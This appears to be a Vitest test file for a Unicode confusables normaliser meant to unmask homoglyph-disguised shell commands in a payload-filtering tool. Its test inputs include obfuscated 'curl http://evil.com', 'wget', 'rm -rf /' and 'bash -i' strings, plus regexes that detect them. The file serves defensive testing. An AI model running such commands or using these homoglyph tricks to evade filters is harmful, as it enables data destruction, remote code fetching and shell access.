import { describe, it, expect, beforeAll } from 'vitest';
import {
  foldHomoglyphs,
  normalizeConfusables,
  normalizeUnicode,
  getConfusablesData,
} from '../../src/utils/confusables.js';
import { PayloadNormalizer } from '../../src/utils/payload-normalizer.js';

describe('confusables TR39', () => {
  beforeAll(() => {
    const data = getConfusablesData();
    expect(data.single.size).toBeGreaterThan(1000);
  });

  it('loads confusables.txt mapping table', () => {
    const { single } = getConfusablesData();
    // Mathematical bold small c → c
    expect(single.get(0x1d41c)).toBe('c');
  });

  it('foldHomoglyphs maps common Cyrillic', () => {
    expect(foldHomoglyphs('саt')).toBe('cat');
  });

  describe('normalizeConfusables — bypass categories', () => {
    const curlPattern = /curl/i;

    it('Greek lunate sigma ϲ → c in curl', () => {
      const n = normalizeUnicode('\u03F2url http://evil.com');
      expect(curlPattern.test(n)).toBe(true);
    });

    it('mathematical monospace curl', () => {
      const input = '\u{1D68C}\u{1D69E}\u{1D69B}\u{1D695} http://evil.com';
      const n = normalizeUnicode(input);
      expect(curlPattern.test(n)).toBe(true);
    });

    it('fullwidth / math wget', () => {
      const n = normalizeUnicode('\u{FF57}\u{FF47}\u{FF45}\u{FF54} http://x');
      expect(/wget/i.test(n)).toBe(true);
    });

    it('confusable rm -rf', () => {
      const n = normalizeUnicode('\u{FF52}\u{FF4D} -rf /');
      expect(/rm\s+-rf/i.test(n)).toBe(true);
    });

    it('fullwidth confusable sh in command', () => {
      const n = normalizeUnicode('bash \uFF53\uFF48');
      expect(/sh/i.test(n)).toBe(true);
    });

    it('confusable bash -i', () => {
      const n = normalizeUnicode('\u{1D41B}\u{1D44E}\u{1D460}\u{1D421} -\u{FF49}');
      expect(/bash\s+-i/i.test(n)).toBe(true);
    });

    it('Armenian ԝ in wget-like token', () => {
      const n = normalizeConfusables('\u051Dget http://x');
      expect(/w/.test(n)).toBe(true);
    });
  });

  describe('PayloadNormalizer unicode_strict', () => {
    it('applies confusables when unicode_strict is true', () => {
      const normalizer = new PayloadNormalizer(5, 1_000_000, true);
      const { normalized, transformations } = normalizer.normalize(
        '\u{1D68C}\u{1D69E}\u{1D69B}\u{1D695} http://evil.com',
      );
      expect(/curl/i.test(normalized)).toBe(true);
      expect(transformations).toContain('confusables-tr39');
    });

    it('skips confusables when unicode_strict is false', () => {
      const normalizer = new PayloadNormalizer(5, 1_000_000, false);
      const greekCurl = '\u03F2url http://evil.com';
      const { normalized, transformations } = normalizer.normalize(greekCurl);
      expect(transformations).not.toContain('confusables-tr39');
      expect(/curl/i.test(normalized)).toBe(false);
    });
  });

  it('order: confusables before NFKC', () => {
    const mathCurl = '\u{1D68C}\u{1D69E}\u{1D69B}\u{1D695}';
    const onlyConf = normalizeConfusables(mathCurl);
    const full = normalizeUnicode(mathCurl);
    expect(onlyConf).toBe('curl');
    expect(full).toBe('curl');
  });
});
